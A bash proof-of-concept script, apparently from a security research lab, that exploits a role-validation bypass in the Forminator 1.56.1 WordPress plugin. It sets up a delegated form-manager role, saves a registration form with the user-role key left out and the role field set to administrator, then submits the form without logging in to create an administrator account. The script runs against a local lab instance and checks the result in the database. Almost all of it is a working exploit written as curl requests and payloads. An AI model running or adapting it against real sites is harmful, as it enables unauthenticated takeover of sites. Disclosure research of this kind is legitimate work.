#!/usr/bin/env bash
# frm-008 OTW PoC — forminator 1.56.1 registration-form role-validation key-omission bypass
# Engagement: eng-a792eef62402 | rig: lab_forminator_1.56.1_wp6.8.3_php7.4 (WP 6.8.3 / PHP 7.4)
# Chain: delegated form-manager (manage_forminator_modules + create_users, NO promote_users)
#        saves a registration form with `registration-user-role` OMITTED and
#        `registration-role-field=administrator` -> validator skips both branches
#        (helper-core.php:2087/:2092) -> public unauth submission creates an ADMINISTRATOR.
# Asserts on the DB side-effect (user + role), never on HTTP codes.
set -u
LAB=/home/mcipekci/wp/labs/lab_forminator_1.56.1_wp6.8.3_php7.4
URL=http://127.0.0.1:43141
WEB=$LAB/web
WP="/home/mcipekci/wp/php7.4/php /home/mcipekci/wp/wp-cli.phar --path=$WEB --allow-root"
JAR=/tmp/opencode/frm008_formmgr.jar
JAR2=/tmp/opencode/frm008_admin.jar
MARK="RS_FRM008_$(date +%s)"
PASSWD="Frm008!$(shuf -i 10000-99999 -n 1)"

echo "== [0] clean slate =="
$WP user delete pwned008 --yes 2>/dev/null; $WP user delete formmgr --yes 2>/dev/null
$WP post delete $($WP post list --post_type=forminator_forms --field=ID 2>/dev/null) --force 2>/dev/null

echo "== [1] delegated role+user (NO promote_users, NO administrator) =="
$WP role create formmgr "Form Manager" >/dev/null
$WP cap add formmgr manage_forminator_modules >/dev/null
$WP cap add formmgr create_users >/dev/null
$WP cap add formmgr read >/dev/null
$WP user create formmgr formmgr@example.test --role=formmgr --user_pass="FrmMgr!Pass1" >/dev/null
echo -n "formmgr caps: "; $WP cap list formmgr | tr '\n' ' '; echo
# ADMIN-side legitimate delegation via Forminator Settings > Permissions (role row):
$WP user create admin admin@example.test --role=administrator --user_pass=labpass >/dev/null 2>&1
$WP option update forminator_permissions '[{"permission_type":"role","user_role":"formmgr","exclude_users":[]}]' --format=json >/dev/null
echo "forminator_permissions option set (role formmgr delegated — the plugin's own UI action)"

echo "== [2] draft form target (id) =="
FORM_ID=$($WP post create --post_type=forminator_forms --post_title='reg008' --post_status=draft --porcelain)
echo "form_id=$FORM_ID"

echo "== [3] login as formmgr =="
curl -s -c "$JAR" "$URL/wp-login.php" -d "log=formmgr&pwd=FrmMgr!Pass1&wp-submit=Log+In&redirect_to=$URL/wp-admin/" -o /dev/null
curl -s -b "$JAR" "$URL/wp-admin/" | grep -q "Dashboard" && echo "formmgr session OK"

echo "== [4] mint save_builder nonce in formmgr session =="
NONCE=$(curl -s -b "$JAR" "$URL/?__labnonce=1&labkey=labkey_e3c8a9aa4d3f26d4223ffb8a77a082cb&actions=forminator_save_builder_fields" | python3 -c "import sys,json;print(json.load(sys.stdin)['forminator_save_builder_fields'])")
echo "nonce=$NONCE"

echo "== [5] NEGATIVE CONTROL first: keys PRESENT -> validator fixed branch must REJECT =="
DATA_CTRL='{"wrappers":[{"wrapper_id":"c-wrap-1","fields":[
 {"type":"text","element_id":"text-1","cols":12,"field_label":"Username"},
 {"type":"email","element_id":"email-1","cols":12,"field_label":"Email"}]}],
 "settings":{"form-type":"registration","formName":"reg008",
 "registration-username-field":"text-1","registration-email-field":"email-1","registration-password-field":"auto","activation-method":"default",
 "registration-user-role":"fixed","registration-role-field":"administrator"}}'
CTRL=$(curl -s -b "$JAR" -d "action=forminator_save_builder&form_id=$FORM_ID&formName=reg008&status=publish&version=1.0&data=$DATA_CTRL" \
      -d "forminator_nonce=$NONCE" "$URL/wp-admin/admin-ajax.php" --data-urlencode "data=$DATA_CTRL" -G 2>/dev/null)
CTRL=$(curl -s -b "$JAR" "$URL/wp-admin/admin-ajax.php" \
  --data-urlencode "action=forminator_save_builder" \
  --data-urlencode "form_id=$FORM_ID" \
  --data-urlencode "formName=reg008" \
  --data-urlencode "status=publish" \
  --data-urlencode "version=1.0" \
  --data-urlencode "_ajax_nonce=$NONCE" \
  --data-urlencode "data=$DATA_CTRL")
echo "control resp: $(echo "$CTRL" | head -c 220)"
echo "$CTRL" | grep -q "invalid_user_role" && echo "CONTROL OK: fixed+administrator REJECTED for formmgr" || echo "CONTROL UNEXPECTED (check resp)"

echo "== [6] ATTACK: registration-user-role OMITTED -> both validator branches skipped =="
DATA_ATK='{"wrappers":[{"wrapper_id":"c-wrap-1","fields":[
 {"type":"text","element_id":"text-1","cols":12,"field_label":"Username"},
 {"type":"email","element_id":"email-1","cols":12,"field_label":"Email"}]}],
 "settings":{"form-type":"registration","formName":"reg008",
 "registration-username-field":"text-1","registration-email-field":"email-1","registration-password-field":"auto","activation-method":"default",
 "registration-role-field":"administrator"}}'
ATK=$(curl -s -b "$JAR" "$URL/wp-admin/admin-ajax.php" \
  --data-urlencode "action=forminator_save_builder" \
  --data-urlencode "form_id=$FORM_ID" \
  --data-urlencode "formName=reg008" \
  --data-urlencode "status=publish" \
  --data-urlencode "version=1.0" \
  --data-urlencode "_ajax_nonce=$NONCE" \
  --data-urlencode "data=$DATA_ATK")
echo "attack resp: $(echo "$ATK" | head -c 220)"
echo "$ATK" | grep -q '"success":true' && echo "SAVE ACCEPTED (validator skipped)" || { echo "SAVE FAILED"; exit 1; }

echo "== [7] persisted settings show omission =="
$WP post meta get $FORM_ID "forminator_form_meta" 2>/dev/null | grep -o "registration-[a-z-]*[\"':]*[^,}]*" | head -6

echo "== [8] UNAUTH submission =="
SUB_NONCE=$(curl -s "$URL/wp-admin/admin-ajax.php" -d "action=forminator_get_nonce" -d "form_id=$FORM_ID" | grep -oE '"[0-9a-f]{10}"' | tr -d '"')
echo "submit nonce=$SUB_NONCE"
SUB=$(curl -s "$URL/wp-admin/admin-ajax.php" \
  -d "action=forminator_submit_form_custom-forms" \
  -d "form_id=$FORM_ID" \
  --data-urlencode "text-1=pwned008" \
  --data-urlencode "email-1=pwned008@example.test" \
  -d "forminator_nonce=$SUB_NONCE")
echo "submit resp: $(echo "$SUB" | head -c 260)"

echo "== [9] SIDE-EFFECT ASSERT: new user must be administrator =="
ROLES=$($WP user get pwned008 --fields=roles 2>&1 | tail -1)
echo "pwned008 roles: $ROLES"
if echo "$ROLES" | grep -q administrator; then
  echo "MARKER $MARK VERIFIED: unauth-created user is ADMINISTRATOR"
else
  echo "MARKER $MARK FAILED"; $WP user list --fields=ID,user_login,roles | tail -6; exit 1
fi
